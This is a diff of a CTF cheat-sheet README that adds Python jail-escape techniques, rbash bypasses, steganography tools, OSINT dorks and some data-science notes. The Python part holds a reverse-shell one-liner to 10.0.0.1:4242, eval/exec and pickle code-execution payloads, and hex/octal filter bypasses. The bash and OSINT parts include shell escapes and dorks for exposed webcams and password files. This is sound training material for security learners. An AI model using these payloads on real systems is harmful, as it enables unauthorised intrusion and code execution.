+    exec('socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")') 
+    ```
+
+* `eval`
+
+    `eval` evaluates a python expression from a string. It can also be used to execute arbitrary code, but does not allow for multiple statements. (with ';' or '\n')
+
+    ```python
+    eval("__import__('os').system('ls')") # List files
+    eval("open('flag.txt').read()")       # Read flag.txt
+    eval("(a:=globals())") # Walrus operator trick to assign globals() to a variable and return it
+    ```
+    
+* Command obfuscation
+
+    * Unicode
+
+        Python keywords can be written in unicode. For example, `exec` can be written as `eｘec`. This very useful to bypass filters.
+
+        ```python
+        def find_unicode_variant(s):
+            result = ""
+            for c in s:
+                offset = ord(c) - ord('A')
+                result += chr(0xff21 + offset)
+            return result
+        ```
+
+        Note: Unicode characters take more than a single byte to be represented in an encoded format. For example `ｘ` is represented by the bytes `ef bd 98`. This can be a problem if the input is filtered to remove non ascii characters or if the size of the input is limited.
+
+    * Hex
+
+        If the input is filtered before being passed to python, the hex representation can be used to bypass the filter.
+
+        ```python
+        exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29") # eval("__import__('os').system('ls')")
+        ```
+
+        Note: This does not work when the filter is in python since this string is strictly equivalent to `"__import__('os').system('ls')"`
+
+    * Ocal
+
+        Same as hex, it is an alternative representation of python strings.
+
+        ```python
+        exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51") # eval("__import__('os').system('ls')")
+        ```
+
+
+* Escape sandbox environment
+
+    When the environment is sandboxed, some functions are not directly available. Global variables can be used to access them.
+
+    ```python
+    ().__class__.__base__.__subclasses__() # Gives access to `object` subclasses
+
+* Python's 2 input() function
+
+    `python2`'s `input()` function is equivalent to `eval(raw_input())` in python3. So, you can execute arbitrary python expressions.
+
+    ```python
+    open("/tmp/out.txt", "w").write(open(".passwd").readline().strip())
+    ```
+
+* Pickle deserialization injection
+
+    `pickle.loads` can execute code when deserializing a user provided string.
+
+    ```python
+    class rce():
+        def __reduce__(self):
+            import os
+            return (os.system, ('ls',))
+    payload_bytestring = pickle.dumps(rce())
+    ```
+
+* Python libraries that can execute commands
+
+    Some python libraries allows for code/command execution when provided with unsanitized input. Here are the most common ones:
+
+    ```python
+    df.query('@__builtins__.__import__("os").system("ls")') # Pandas dataframe
+    subprocess.call("ls", shell=True)
+    subprocess.Popen("ls", shell=True)
+    pty.spawn("ls")
+    pty.spawn("/bin/bash")
+    ```
+
+* When calls are disabled
+
+    WHen calls are disabled, an attacker can use decorators still execute code.
+
+    ```python
+    # equivalent to X = exec(input(X))
+    @exec
+    @input
+    class X:
+        pass
+    ```
+
+
+    [Google CTF challenge](https://ctftime.org/task/22891)
+
+
+
+
+## Bash
+
+
+
+* Missing `ls` or `dir` commands
+
+	If you cannot run `ls`, `dir`, `find` nor `grep` to list files you can use
+
+	```
+	echo *
+	echo /any/path/*
+	```
+
+
+* restricted bash (`rbash`) - [GitHub Gist](https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290)
+
+	`rbash` is a shell with restriction features. Misconfigured `rbash` can be bypassed.
+
+	```bash
+    # List available commands
+    compgen -c
+
+    # Run bash without profiles (when rbash is initialized in .bashrc)
+    bash --noprofile
+
+    # Read files
+	mapfile -t  < /etc/passwd
+	printf "$s\n" "${anything[@]}"
+	```
+
+* shell from provided commands - [Website](https://gtfobins.github.io/)
+
+    Some commands/binaries allows to pop a shell. Use [GTFOBins](https://gtfobins.github.io/) to find them. Here are the most common ones:
+
+    | Command | Description |
+    | --- | --- |
+    | less | `!/bin/sh` |
+    | vim | `:!/bin/sh` |
+
+
+
+<br><br>
+
+# Steganography
+
+
+
+### Online tools
+
+* `AperiSolve` <span style="color:red">❤️</span> - [Website](https://www.aperisolve.com/)
+
+	Online tool that run several steganography tools.
+
+* `Steganography Online` - [Website](http://stylesuxx.github.io/steganography/)
+
+	Online tool to hide data in images.
+
+
+### Detection tools
+
+* `Stegsolve.jar` <span style="color:red">❤️</span> - [Website](http://www.caesum.com/handbook/stego.htm) 
+
+	View the image in different colorspaces and alpha channels. I recommend using [this patched version](https://github.com/Giotino/stegsolve) to be able to zoom out.
+
+* `zsteg` <span style="color:red">❤️</span> - [GitHub](https://github\.com/zed-0xff/zsteg)
+
+	Command-line tool for **PNG** and **BMP** steganography.
+
+* `jsteg` - [GitHub](https://github\.com/lukechampine/jsteg)
+
+    Command-line tool for **JPEG** steganography.
+
+* [Jstego](https://sourceforge.net/projects/jstego/)
+
+    GUI tool for **JPG** steganography.
+
+* `exiftool` <span style="color:red">❤️</span> - [Website](https://exiftool.org/)
+
+	Tool to view and edit metadata in files.
+
+
+### Image steaganography implementations
+
+Many steganography implementations exists. Here is a list of some of them. 
+
+* `steghide` - [Website](http://steghide.sourceforge.net/)
+
+	Hide data in various kinds of image- and audio-files using a passphrase. The password can be empty.
+
+* `StegCracker` - [GitHub](https://github.com/Paradoxis/StegCracker)
+
+	Brute force passphrases for steghide encrypted files. Different data can have different passphrases.
+
+* `StegSeek` - [GitHub](https://github.com/RickdeJager/stegseek)
+
+	Faster than `stegcracker`.
+
+* `steg_brute.py` - [GitHub](https://github\.com/Va5c0/Steghide-Brute-Force-Tool)
+
+	This is similar to `stegcracker`.
+
+* `stepic` - [Website](http://domnit.org/stepic/doc/)
+
+	Python library to hide data in images.
+
+* `Digital Invisible Ink Tool` - [Website](http://diit.sourceforge.net/)
+
+	A Java steganography tool that can hide any sort of file inside a digital image (regarding that the message will fit, and the image is 24 bit color)
+
+* `ImageHide` - [Website](https://www.softpedia.com/get/Security/Encrypting/ImageHide.shtml)
+
+	Hide any data in the LSB of an image. Can have a password.
+
+* `stegoVeritas` - [GitHub](https://github.com/bannsec/stegoVeritas/)
+
+	CLI tool to extract data from images.
+
+* Online LSB Tools
+
+	Some online tools to hide data in the LSB of images.
+
+	[https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/) Only supports PNG
+	[https://stylesuxx.github.io/steganography/](https://stylesuxx.github.io/steganography/)
+
+* `hipshot` - [Website](https://bitbucket.org/eliteraspberries/hipshot)
+
+	A python tool to hide a video in an image.
+
+### Data hidden in the data format
+
+#### Images
+
+* [`APNG`]
+
+	Animated PNG. Use (apngdis)[https://sourceforge.net/projects/apngdis/] to extract the frames and delays.
+
+* `SVG Layers`
+
+	Data can be hidden under SVG layers. `inkview` can be used to view and toggle the layers.
+
+* `Image thumbnails`
+
+	Image thumbnails can be different from the image itself.
+	```
+	exiftool -b -ThumbnailImage my_image.jpg > my_thumbnail.jpg
+	```
+
+* Corrupted image files
+
+	See `Images` in the `Forensics` section.
+
+#### Text
+
+* Unicode Steganography / Zero-Width Space Characters
+
+	Messages can be hidden in the unicode characters. For example using the zero-width space character in it. Use a modern IDE like [Code](https://code.visualstudio.com/) to find these characters.
+
+* Whitespace
+
+	Tabs and spaces (for example in the indentation) can hide data. Some tools can find it: [`snow`](http://www.darkside.com.au/snow/) or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)
+
+* `snow` - [Website](http://www.darkside.com.au/snow/)
+
+	A command-line tool for whitespace steganography.
+
+
+#### Audio
+
+* `spectrogram` - [Wikipedia](https://en.wikipedia.org/wiki/Spectrogram)
+
+	An image can be hidden in the spectrogram of an audio file. [`audacity`](https://www.audacityteam.org/) can show the spectrogram of an audio file. (To select Spectrogram view, click on the track name (or the black triangle) in the Track Control Panel which opens the Track Dropdown Menu, where the spectrogram view can be selected.. )
+
+* `XIAO Steganography` - [Website](https://xiao-steganography.en.softonic.com/)
+
+	Windows software to hide data in audio.
+
+* `DTMF` - [Wikipedia](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).
+
+	Dual tone multi-frequency is a signaling system using the voice-frequency band over telephone lines. It can be used to send text messages over the phone. Some tool: [Detect DTMF Tones](http://dialabc.com/sound/detect/index.html) 
+	
+#### QR codes
+
+* `QR code` - [Wikipedia](https://en.wikipedia.org/wiki/QR_code) 
+	
+	Square barcode that can store data.
+
+* `zbarimg` - [Website](https://linux.die.net/man/1/zbarimg)
+
+	CLI tool to scan QR codes of different types.
+<br><br>
+
+# OSINT
+
+⇨ [Email](#email)<br>
+⇨ [Images](#images)<br>
+⇨ [Map](#map)<br>
+⇨ [Username](#username)<br>
+⇨ [Dorking](#dorking)<br>
+
+
+* `Wayback machine` - [Website](https://archive.org/)
+
+    Find old/previous versions of a website.
+
+## Email
+
+
+
+* `Epieos` - [Website](https://epieos.com)
+
+    Find information about an email.
+
+
+* `gmail address`
+
+    A gmail address can be used to query public information on google services like Google Maps reviews or Google Calendar events. [Epieos](https://epieos.com) can find such services.
+
+
+
+
+
+## Images
+
+
+
+* `EXIF data`
+
+    Metadata of images can be used to find information about the image, such as the location where it was taken, the device used to take the picture, etc.
+
+    Use [exiftool](https://exiftool.org/) to extract metadata from images.
+
+* `Reverse image search` - [Website](https://images.google.fr/)
+
+    Search by image. Can be used to find similar images, or to find the source of an image. Here are the most common search engines:
+
+    | Search engine | Description |
+    | --- | --- |
+    | [Google Lens](https://images.google.fr/) | The most popular one. Can be used to search quickly parts of an image. |
+    | [Bing Images](https://www.bing.com/images) | Microsoft's search engine. |
+    | [TinEye](https://tineye.com/) | Reverse image search engine. Very useful to search the exact same image on the internet. |
+    | [Yandex](https://yandex.com/images/) | Russian search engine. Can be used to find images that are not indexed by Google. |
+
+    
+
+
+
+## Map
+
+
+
+* `What 3 words` - [Website](https://what3words.com/)
+
+    Associate 3 words to a location on earth. 
+
+    To be kept in mind for OSINT challenges.
+
+* `Guess location from Images/Google Steet view`
+
+    Several websites such as [Geohints](https://geohints.com) can help find location from Google Street view, or even general images.
+
+* `Google street view`
+
+    Google street view can be used to find location from images. 
+
+    It can also be used to find information about a location, such as the name of a shop or a restaurant.
+    
+
+* `ADS-B` - [Wikipedia](https://en.wikipedia.org/wiki/Automatic_Dependent_Surveillance%E2%80%93Broadcast)
+
+    ADS-B is a technology used by air-crafts to broadcast their position. 
+
+    This information can be used to find information about a flight, such as the departure and arrival airports, the flight number, etc.
+
+    [adsbexchange.com](https://globe.adsbexchange.com) can be used to find free public ADS-B data.
+
+
+
+## Username
+
+
+
+* `Sherlock` - [GitHub](https://github\.com/sherlock-project/sherlock)
+
+    Python script to search for usernames across social networks.
+
+
+
+
+## Dorking
+
+
+
+Dorking is the process of using search engines to find information about a target.
+
+
+* `Google Dorks` - [Wikipedia](https://en.wikipedia.org/wiki/Google_hacking) [CheatSheet](https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06) 
+
+    Use Google's search engine to find indexed pages that contain specific information.
+    provides detailed information about Google Dorks.
+
+    The most common ones are:
+    ```bash
+    site:example.com           # Search for a specific domain
+    inurl: "ViewerFrame?Mode=" # Search for a specific string in the URL (exposed webcams)
+    intitle: "index of"        # Search for a specific string in the title of the page (exposed dirs)
+    filetype:pdf               # Search for a specific file type
+    ```
+
+* `Github Dorks`
+
+    Use Github's search engine to find indexed files that contain specific information. [This documentation](https://docs.github.com/en/search-github/searching-on-github) can be used to craft search queries.
+
+    Github users can be tracked using [Gitive](https://github.com/mxrch/GitFive).
+
+    The most common dork keywords are:
+    ```bash
+    filename:passwords.txt     # Search for a specific filename
+    extension:txt              # Search for a specific file extension
+    owner:username             # Search for a specific username
+    
+    # In commits
+    author-name:username       # Search for a specific commit author
+    author-email:u@ex.com      # Search for a specific commit author email
+    committer-name:username    # Search for a specific committer
+    committer-email:u@ex.com   # Search for a specific committer email
+    ```
+
+    
+
+
+<br><br>
+
 # Miscellaneous
 
-⇨ [Esoteric Languages](#esoteric-languages)<br>
 ⇨ [Wireless](#wireless)<br>
-⇨ [Data Science](#data-science)<br>
 ⇨ [Signal processing](#signal-processing)<br>
+⇨ [Data Science](#data-science)<br>
+⇨ [Esoteric Languages](#esoteric-languages)<br>
 
 
 This section details some miscellaneous topics that are not directly related to security challenges, but are still useful to know as a CTF player.
+
+## Wireless
+
+
+
+* `gnuradio` - [Website](https://wiki.gnuradio.org/index.php/InstallingGR)
+
+    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyze RF (Radio Frequency) signals.
+
+
+
+## Signal processing
+
+
+
+* `Scipy` - [Website](https://scipy.org/install/)
+
+    Can be used for signal processing.
+
+    Example is provided in [process_signal.ipynb](Miscellaneous/Signal%20processing/Tools/process_signal.ipynb)
+
+
+
+## Data Science
+
+⇨ [Supervised Classification](#supervised-classification)<br>
+⇨ [Unsupervised Clasification](#unsupervised-clasification)<br>
+
+
+
+
+* `SciKit Lean` - [Website](https://scikit-learn.org/)
+
+    Machine learning in Python.
+
+* `SciKit Mine` - [Website](https://scikit-mine.github.io/scikit-mine/)
+
+    Data mining in Python.
+
+* `(Book) Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow, Aurélien Géron`
+
+    Very useful book that was used to create this section.
+
+### Supervised Classification
+
+
+
+####### Models
+
+* `Logistic Regression`
+
+    High explainability, reasonable computation cost.
+
+* `Decision Tree`
+
+    Performs classification, regression, and multi-output tasks. Good at finding **orthogonal** decision boundaries.
+
+    But very sensitive to small changes in the data, which make them hard to train.
+
+
+* `Random Forest`
+
+    Very powerful model. Uses an ensemble method to combine multiple decision trees. 
+
+
+* `Support Vector Machine (SVM)`
+
+    Popular model that performs linear and non-linear classification, regression, and outlier detection.
+
+    Works well with **small to medium** sized datasets.
+
+
+* `K-Nearest Neighbors (KNN)`
+
+
+* `Naive Bayes`
+
+* `Multi Layer Perceptron (MLP)`
+
+    A neural network model that can learn non-linear decision boundaries.
+
+    Good for **large** datasets.
+
+
+
+### Unsupervised Clasification
+
+
+
+###### Models
+
+* `K-Means Clustering`
+
+    Simple clustering algorithm that groups data points into a specified number of clusters.
+
+* `Gaussian Mixture Model (GMM)`
+
+    A probabilistic model that assumes that the data was generated from a finite sum of Gaussian distributions.
+
+
+
+
+
+
+
 
 ## Esoteric Languages
 
@@ -3199,111 +3304,6 @@ Languages
 
 	Whisper my world
 	```
-
-
-
-## Wireless
-
-
-
-* `gnuradio` - [Website](https://wiki.gnuradio.org/index.php/InstallingGR)
-
-    `gnuradio` and it's GUI `gnuradio-companion` are used to create or analyze RF (Radio Frequency) signals.
-
-
-
-## Data Science
-
-⇨ [Supervised Classification](#supervised-classification)<br>
-⇨ [Unsupervised Clasification](#unsupervised-clasification)<br>
-
-
-
-
-* `SciKit Lean` - [Website](https://scikit-learn.org/)
-
-    Machine learning in Python.
-
-* `SciKit Mine` - [Website](https://scikit-mine.github.io/scikit-mine/)
-
-    Data mining in Python.
-
-* `(Book) Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow, Aurélien Géron`
-
-    Very useful book that was used to create this section.
-
-### Supervised Classification
-
-
-
-####### Models
-
-* `Logistic Regression`
-
-    High explainability, reasonable computation cost.
-
-* `Decision Tree`
-
-    Performs classification, regression, and multi-output tasks. Good at finding **orthogonal** decision boundaries.
-
-    But very sensitive to small changes in the data, which make them hard to train.
-
-
-* `Random Forest`
-
-    Very powerful model. Uses an ensemble method to combine multiple decision trees. 
-
-
-* `Support Vector Machine (SVM)`
-
-    Popular model that performs linear and non-linear classification, regression, and outlier detection.
-
-    Works well with **small to medium** sized datasets.
-
-
-* `K-Nearest Neighbors (KNN)`
-
-
-* `Naive Bayes`
-
-* `Multi Layer Perceptron (MLP)`
-
-    A neural network model that can learn non-linear decision boundaries.
-
-    Good for **large** datasets.
-
-
-
-### Unsupervised Clasification
-
-
-
-###### Models
-
-* `K-Means Clustering`
-
-    Simple clustering algorithm that groups data points into a specified number of clusters.
-
-* `Gaussian Mixture Model (GMM)`
-
-    A probabilistic model that assumes that the data was generated from a finite sum of Gaussian distributions.
-
-
-
-
-
-
-
-
-## Signal processing
-
-
-
-* `Scipy` - [Website](https://scipy.org/install/)
-
-    Can be used for signal processing.
-
-    Example is provided in [process_signal.ipynb](Miscellaneous/Signal%20processing/Tools/process_signal.ipynb)
 
 
 <br><br>
